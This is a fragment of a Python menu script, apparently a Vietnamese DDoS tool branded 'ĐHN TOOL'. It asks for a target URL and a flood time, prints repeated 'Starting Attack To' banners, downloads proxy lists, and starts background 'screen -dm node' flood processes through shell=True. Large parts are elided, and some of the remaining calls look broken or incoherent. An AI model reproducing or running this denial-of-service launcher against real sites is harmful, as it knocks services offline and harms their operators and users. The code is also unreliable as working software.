...
""")
		...
		while True:
			sys.stdout.write(Color.LB+"📌 "+Color.LR+"["+Color.LG+"ĐHN TOOL""]"+Color.LB+"\n➠ "+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				try:
					...
					subprocess.run([f'screen -dm node http.txt {floodtime} {reqs}'], shell=True)
				except:
				...
				try:
					...
					with open("http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node http.txt {floodtime} 64 1'], shell=True)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
				...
				try:
					url = str(input(f"{Color.LG} ♫ Url: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} ♫ Time: "+Color.RESET))
					DHN_TOOL.styleText(" Không Được DDoS Web Chính Phủ...\n")
					for i in range(150):
						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
						print (f"{Color.LY}Starting Attack To ➠ {Color.LY}" + url)
					...
					with open("http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node {floodtime}'], shell=True)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
...
if __name__ == '__main__':
	...
	contact = f"""Facebook: https://www.facebook.com/doanhainguyen.xyz\nZalo: zalo bị khoá r lười tạo zalo mới"""
	ĐHN_TOOL = Home(commands, contact)
	main()
